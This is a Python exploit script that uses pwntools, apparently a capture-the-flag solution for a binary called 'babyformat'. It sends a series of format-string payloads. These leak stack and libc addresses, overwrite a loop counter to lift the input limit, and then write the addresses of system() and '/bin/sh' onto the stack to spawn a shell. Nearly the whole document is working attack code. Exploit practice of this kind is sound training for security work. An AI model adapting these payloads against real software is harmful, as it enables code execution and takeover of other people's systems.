# format string 
#Todo:
# 1.stack_add -> count_add
# 2.rewrite count to negative number ( unlimit input)

from pwn import *
s = process('./babyformat')
raw_input("i am a noob")

payload = '%p%9$p%6$p' # leak add
s.recvuntil("==== Baby Format - Echo system ====\n")
s.sendline(payload)

BUFF_add = int(s.recv(10),16)
stack_add = int(s.recv(10),16)
ebp_add_main = int(s.recv(10),16)
ret_add_main = ebp_add_main + 4
count_add = ebp_add_main - 0xc

print "BUFF: 0x%x" % (BUFF_add)
print "stack_add: 0x%x" % (stack_add)
print "ebp_add: 0x%x" % (ebp_add_main)
print "ret_add_main: 0x%x" % (ret_add_main)
print "count: 0x%x" % (count_add)

# stack_add -> 39 -> count_add
rewrite_offset = count_add ^ 0xffff0000+3
print "write_add: 0x%x" % rewrite_offset
payload2 = '%' + str(rewrite_offset) +'x%9$hn'
s.sendline(payload2)

# send gia tri am cho bien count

payload3 = '%' + str(0xff) + 'x%57$hhn'
s.sendline(payload3)

# leak libc
payload4 = '%15$p'
s.sendline(payload4)
s.recvuntil('0x')
libc_main_start = int(s.recv(8),16)
print "libc: 0x%x" %libc_main_start
offset_system = 0x22769 # system - libc_start
offset_binsh = 0x1433d4 # binsh - libc_start
system_add = libc_main_start + offset_system
binsh_add = libc_main_start + offset_binsh
print "system_add: 0x%x" % system_add
print "binsh_add: 0x%x" % binsh_add

def high(address):
	return (address ^ 0xffff) >> 16
def low(address):
	return (address&0xffff)

#write add 2 bytes low system
system_stack = ebp_add_main + 0x1c - 8;
offset = system_stack ^ 0xffff0000
payload9 = '%' + str(offset) + 'x%9$hn'
s.sendline(payload9)

#write add 2 bytes high system
payload10 = '%' + str(offset+2) + 'x%10$hn'
s.sendline(payload10)
s.interactive() # get \n

# write 2 bytes low system
payload11 = '%' + str(low(system_add)) + 'x%57$hn'
s.sendline(payload11)
s.interactive() # get \n

#write 2 bytes high system
payload12 = '%' + str(high(system_add)) + 'x%59$hn'
s.sendline(payload12)
s.interactive() # get \n

# write add 2 bytes low  /bin/sh 
bin_sh_stack = ebp_add_main + 0x8
offset = bin_sh_stack ^ 0xffff0000
payload5 = '%' + str(offset) + 'x%9$hn'
s.sendline(payload5)

#write add 2 bytes high /bin/sh
payload6 = '%' + str(offset+2) + 'x%10$hn'
s.sendline(payload6)
s.interactive() # get \n

# write 2 bytes low /bin/sh
payload7 = '%' + str(low(binsh_add)) + 'x%57$hn'
s.sendline(payload7)
s.interactive() # get \n

#write 2 bytes high /bin/sh
payload8 = '%' + str(high(binsh_add)) + 'x%59$hn'
s.sendline(payload8)
s.interactive() # get \n

s.sendline("EXIT")
s.interactive()	
